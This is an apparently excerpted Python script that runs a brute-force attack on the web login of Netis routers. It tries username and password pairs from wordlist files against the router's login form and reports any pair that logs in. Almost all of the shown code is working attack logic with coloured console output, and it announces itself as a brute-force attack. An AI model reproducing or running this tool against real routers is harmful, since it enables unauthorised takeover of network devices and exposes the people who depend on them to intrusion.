...
def First_Packet():
	...
	try:
		get("http://"+argv[1],timeout=5)
		cprint("[+] Target ===> ","yellow",attrs=["bold"],end="")
		cprint(argv[1],"white",attrs=["bold"])
	except:
		cprint("[-] Error: Invalid Router_IP.","red",attrs=["bold"])
		cprint("[?] Usage: ","white",attrs=["bold"],end="")
		cprint("python3 "+argv[0]+" <Router_IP> <Router_Name> <Username_File> <Password_File> OR <Username_and_Password_File_Separated_By_':'>\n","green",attrs=["bold"])
		exit()

def Error():

	cprint("Usage: ","white",attrs=["bold"],end="")
	cprint("python3 "+argv[0]+" <Router_IP> <Router_Name> <Username_File> <Password_File> OR <Username_and_Password_File_Separated_By_':'>","green",attrs=["bold"])
	cprint("Example: ","white",attrs=["bold"],end="")
	cprint(f"python3 {argv[0]} 192.168.1.1 NETIS Wordlist","green",attrs=["bold"])
	cprint("Use ","white",attrs=["bold"],end="")
	cprint("-h","green",attrs=["bold"],end="")
	cprint(", ","white",attrs=["bold"],end="")
	cprint("--help","green",attrs=["bold"],end="")
	cprint(" To Show Help Message.\n","white",attrs=["bold"])
	exit()
...
def Netis():
	...
	if len(argv) == 4:
		...
		try:
			...
			cprint("[+] Wordlist ===> ","yellow",attrs=["bold"],end="")
			cprint(argv[3],"white",attrs=["bold"])
			cprint("[+] Starting The Brute-Force Attack...","red")
			cprint("="*50,"white",attrs=["bold"])
		except:
			cprint("[-] Error: Wordlist File Not Found.","red",attrs=["bold"])
			cprint("[?] Usage: ","white",attrs=["bold"],end="")
			cprint("python3 "+argv[0]+" <Router_IP> <Router_Name> <Username_File> <Password_File> OR <Username_and_Password_File_Separated_By_':'>\n","green",attrs=["bold"])
			exit()
		for line in File1.readlines():
			...
			try:
				Username=all[0].strip()
				Password=all[1].strip()
			except IndexError:
				continue
			try:
				r=post(url, data=f"username={Username}&password={Password}&submit.htm")
			except KeyboardInterrupt:
				cprint("Stopped by the user.","yellow","on_red",attrs=["bold"])
				exit()
			except:
				continue
			if "Username or password error, try again!" in str(r.content):
				cprint("[","red",attrs=["bold"],end="")
				cprint(count,"white",attrs=["bold"],end="")
				cprint("]","red",attrs=["bold"],end=" ")
				cprint(f"Invalid data, {line.strip()}","grey",attrs=["bold"])
			else:
				cprint("----------------------------------","white",attrs=["bold"])
				cprint("[","green",attrs=["bold"],end="")
				cprint(count,"white",attrs=["bold"],end="")
				cprint("]","green",attrs=["bold"],end=" ")
				cprint(f"Logged in, {Username}:{Password}","grey",attrs=["bold"])
				cprint("----------------------------------","white",attrs=["bold"])
				quit()
			count+=1
		...
		cprint(count,"white",attrs=["bold"],end="")
		cprint("]","yellow",attrs=["bold"],end=" ")
		cprint("Finished without any results.","cyan",attrs=["bold"])
	elif len(argv) == 5:
		First_Packet()
		try:
			file1=open(argv[3],"r",encoding='latin-1')
			cprint("[+] Usernames Wordlist ===> ","yellow",attrs=["bold"],end="")
			cprint(argv[3],"white",attrs=["bold"])
			file2=open(argv[4],"r",encoding='latin-1')
			cprint("[+] Passwords Wordlist ===> ","yellow",attrs=["bold"],end="")
			cprint(argv[4],"white",attrs=["bold"])
			cprint("[+] Starting The Brute-Force Attack...","red")
			cprint("="*50,"white",attrs=["bold"])
		except:
			cprint("[-] Error: Wordlist File Not Found.","red",attrs=["bold"])
		...
		for Line1,Line2 in zip(file1.readlines(),file2.readlines()):
			...
			if "Username or password error, try again!" in str(R.content):
				...
				cprint(count,"white",attrs=["bold"],end="")
				cprint("]","red",attrs=["bold"],end=" ")
				cprint(f"Invalid data, {UsernamE}:{PassworD}","grey",attrs=["bold"])
			else:
				cprint("----------------------------------","white",attrs=["bold"])
				cprint("[","green",attrs=["bold"],end="")
				cprint(count,"white",attrs=["bold"],end="")
...
if __name__ == "__main__":
	...
	if len(argv) == 2 and argv[1].lower() in ("--help","-h"):
		Banner()
		help()
	elif len(argv) == 4 or len(argv) == 5 and argv[2].lower() == "netis":
		Netis()
	else:
		Error()
